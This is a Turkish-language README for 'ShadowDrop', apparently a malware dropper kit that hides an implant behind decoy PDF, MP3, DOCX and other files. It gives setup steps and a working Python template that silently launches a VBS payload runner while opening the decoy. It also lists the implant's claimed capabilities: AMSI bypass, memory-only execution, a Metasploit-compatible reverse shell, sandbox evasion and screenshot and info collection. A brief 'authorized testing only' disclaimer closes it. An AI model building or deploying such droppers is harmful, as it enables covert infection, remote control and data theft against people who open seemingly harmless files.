# ShadowDrop - Çok Formatlı Stealth Dropper Sistemi

ShadowDrop, PDF, MP3, JPEG, DOCX, ZIP gibi masum görünen dosyaları açarken arka planda **tam fonksiyonlu bir APT implantı** başlatır.  
Bu implant `rubber_final.py` üzerinden çalışır ve ters bağlantı kurar ya da fallback yapar.

---

## 📁 Klasör Yapısı

```
ShadowDrop/
├── src/
│   ├── dropper_pdf.py          → PDF için açıcı & payload tetikleyici
│   ├── dropper_mp3.py          → MP3
│   ├── dropper_docx.py         → DOCX
│   ├── dropper_mp4.py          → MP4
│   ├── dropper_xlsx.py, ...    → Diğer formatlar
│   ├── dropper_docm.py         → Makrolu Word
│   ├── dropper_js.py           → JS tuzağı
│   └── payload_runner.vbs      → rubber_final.py'yi sessiz başlatır
├── files/
│   └── (BOŞ) → Kendi PDF, JPEG, DOCX, ZIP dosyalarınızı buraya koyun
├── README.md                   → Bu açıklama dosyası
└── requirements.txt            → Gerekli pip bağımlılıkları
```

---

## ⚙️ Nasıl Kullanılır?

### 1. Dosyanı ekle

`files/` klasörüne kendi dosyanı koy.  
Örnek: `files/benimodevim.pdf`

---

### 2. Uygun dropper script'ini aç

Örnek olarak `src/dropper_pdf.py` dosyasını:

```python
real_file = "files/benimodevim.pdf"
```

olarak değiştir. Bu, kullanıcının tıkladığı anda açılacak dosyadır.

---

### 3. Çalıştır

```bash
pip install -r requirements.txt
python src/dropper_pdf.py
```

Bu komut:
- Gerçek PDF dosyasını açar (kullanıcı görür)
- Arka planda `payload_runner.vbs` çalışır
- Bu da `rubber_final.py` dosyasını `pythonw.exe` ile başlatır (sessizce)

---

## 🔒 rubber_final.py Ne Yapar?

- ✅ AMSI bypass
- ✅ Memory-only çalıştırma
- ✅ Reverse shell (Metasploit uyumlu)
- ✅ Sandbox tespiti
- ✅ Fallback modu (info toplar, ekran görüntüsü alır, zip yapar)

---

## 📘 Kendi Dropper'ını Yazmak İstersen

```python
import os
import subprocess

real_file = "files/seninbelgen.pdf"

try:
    subprocess.Popen(["wscript.exe", "src/payload_runner.vbs"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
except:
    pass

try:
    os.startfile(real_file)
except:
    pass
```

---

## ⚠️ Uyarı

> Bu araç sadece **izinli test ortamlarında** ve **eğitim amaçlı** kullanılabilir.  
> Kötüye kullanımı yasa dışıdır ve tüm sorumluluk kullanıcıya aittir.
